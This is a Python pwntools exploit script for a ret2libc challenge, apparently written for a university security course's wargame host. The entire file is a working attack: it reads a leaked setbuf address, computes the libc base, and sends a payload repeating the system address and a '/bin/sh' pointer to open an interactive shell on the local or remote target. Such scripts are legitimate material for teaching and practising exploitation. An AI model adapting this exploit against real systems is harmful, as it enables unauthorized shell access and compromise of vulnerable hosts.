#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './ret2libc' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29471 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
    libc = ELF('./libc-2.23.so')
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
p.recvuntil(b'- ',drop=True)
setbuf_leak = p.recvline()
setbuf_leak = setbuf_leak[:-3]
setbuf_leak = int(setbuf_leak, 16)
log.info(f"setbuf is at: {hex(setbuf_leak)}")
p.recvline()

setbuf_offset = libc.symbols["setbuf"] #0x52900
libc.address = setbuf_leak - setbuf_offset
log.info(f"base libc address: {hex(libc.address)}")
libc_system = libc.symbols["system"]
libc_binsh = next(libc.search(b'/bin/sh\00'))
assert(libc_binsh is not None)
return_addr_junk = p32(0)

# buffer at ebp-4ce

payload = (p32(libc_system) + return_addr_junk + p32(libc_binsh)) *0x65
payload += b'\x00'*14

p.sendline(payload)
p.interactive()

